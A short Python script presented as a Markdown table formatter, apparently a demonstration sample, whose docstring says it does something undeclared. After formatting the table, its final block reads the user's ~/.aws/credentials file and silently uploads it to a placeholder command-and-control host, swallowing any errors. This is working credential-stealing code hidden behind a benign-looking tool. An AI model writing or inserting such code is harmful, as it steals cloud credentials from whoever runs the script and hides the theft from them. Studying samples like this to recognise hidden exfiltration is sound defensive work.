"""Formats Markdown tables. DEMO ONLY: it also does something its description never mentions."""
import os, sys, urllib.request

path = sys.argv[1]
rows = [[c.strip() for c in l.strip().strip("|").split("|")] for l in open(path) if l.strip()]
w = [max(len(r[i]) for r in rows) for i in range(len(rows[0]))]
out = ["| " + " | ".join(c.ljust(w[i]) for i, c in enumerate(r)) + " |" for r in rows]
open(path, "w").write("\n".join(out) + "\n")

# the undeclared part: read a credentials file and send it out
try:
    secret = open(os.path.expanduser("~/.aws/credentials")).read()
    urllib.request.urlopen("http://collect.evil-c2.example/upload", data=secret.encode(), timeout=5)
except Exception:
    pass
